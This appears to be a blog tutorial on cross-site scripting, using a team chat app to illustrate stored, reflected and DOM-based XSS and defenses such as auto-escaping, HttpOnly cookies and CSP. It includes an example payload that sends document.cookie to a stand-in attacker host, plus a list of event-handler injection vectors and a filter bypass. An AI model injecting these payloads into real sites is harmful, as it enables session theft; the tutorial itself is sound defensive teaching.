---
title: "Understanding XSS: How Untrusted Input Runs in the Browser"
subtitle: "A practical guide to stored, reflected, and DOM-based cross-site scripting and modern browser defenses."
date: "Oct 2026"
readTime: "5 min read"
tags: ["Frontend", "Security", "WebDev"]
summary: "A practical explanation of Cross-Site Scripting (XSS) through a team chat application, why basic regex filters fail, and how modern frameworks and browser headers keep user sessions safe."
---

### How Browsers Handle Content

Web browsers receive HTML from a server and render it on screen. When the browser encounters a `<script>` tag or an inline event handler, it executes that JavaScript without questioning who submitted it.

If an application accepts input from one user and displays it to another without proper encoding, that input can be interpreted as executable code rather than plain text.

This behavior is known as **Cross-Site Scripting (XSS)**.

---

### A Realistic Example in a Team Chat App

Imagine **Mohit**, **Money**, **Arsh**, and **Dev** use a web-based team chat application.

**Dev** decides to test how the chat handles message formatting. Instead of sending plain text, he submits:

```html
<img src="invalid-image" onerror="fetch('https://attacker-server.com/log?token=' + document.cookie)">
```

When the server saves this message into the database and broadcasts it to the room:

1. **Mohit** and **Arsh** open the chat channel.
2. Their browsers receive the raw HTML string and try to load the image.
3. The image fails to load, immediately triggering the `onerror` event handler.
4. The JavaScript inside `onerror` runs inside Mohit and Arsh's active sessions, giving the script access to readable cookies and local storage tokens.

Because the script executes inside their browsers on the application's domain, it operates with their permissions.

---

### The Three Main Types of XSS

#### 1. Stored XSS
The payload is saved permanently in the application's database (such as a chat message, a task description, or a user profile bio). Whenever another team member views that content, the script runs automatically.

#### 2. Reflected XSS
The payload is included in a URL request (such as a search query parameter: `?query=...`) and the backend reflects it directly into the response without encoding:

```html
<!-- Server generates this directly from URL params -->
<p>Search results for: <script>alert(1)</script></p>
```

If Money sends a malicious link to Arsh, the script executes when Arsh clicks it.

#### 3. DOM-Based XSS
The vulnerability exists entirely in client-side JavaScript. Untrusted data (such as `window.location.hash`) is read and written directly into an unsafe DOM sink:

```javascript
// ❌ Dangerous client-side DOM manipulation
const username = new URLSearchParams(window.location.search).get('user');
document.getElementById('welcome-banner').innerHTML = 'Welcome back, ' + username;
```

---

### Why Custom String Filters Often Fail

Developers sometimes attempt to sanitize input using simple string replacements:

```typescript
// ❌ Insufficient: Easily bypassed
function removeScriptTags(input: string) {
  return input.replace(/<script>/gi, '');
}
```

This approach falls short for several reasons:

1. **Nested keywords**: An input like `<scr<script>ipt>` becomes `<script>` after a single replacement pass.
2. **Alternative HTML vectors**: JavaScript can execute through event handlers without `<script>` tags:
   ```html
   <img src="x" onerror="alert(1)">
   <svg onload="alert(1)">
   <a href="javascript:alert(1)">Click to join meeting</a>
   ```

HTML parsing is complex, which is why manual string filtering should be avoided in favor of structured encoding.

---

### How to Protect Modern Web Applications

#### 1. Rely on Framework Auto-Escaping
Modern UI libraries like **React**, **Vue**, and **Svelte** treat text bindings as plain strings by default:

```tsx
// ✅ Safe: React treats this as text, not executable markup
<div>{message.content}</div>
```

Avoid dangerous escape hatches like `dangerouslySetInnerHTML` in React or `v-html` in Vue unless the content is sanitized with a dedicated library like **DOMPurify**.

#### 2. Use `HttpOnly` Cookies for Session Tokens
Store authentication tokens in cookies marked with the `HttpOnly` and `Secure` flags. This prevents client-side scripts from accessing session tokens through `document.cookie`, limiting the damage if an XSS flaw ever occurs.

#### 3. Implement a Content Security Policy (CSP)
A Content Security Policy header tells the browser which script sources are authorized to execute:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; object-src 'none';
```

With a strong CSP, the browser will refuse to run inline scripts or unauthorized remote scripts, even if an attacker manages to inject them into the HTML.

---

### Key Takeaway

Treat all user-generated content as untrusted data rather than executable markup. Use framework-level escaping, secure cookie flags, and Content Security Policies to build defense in depth.
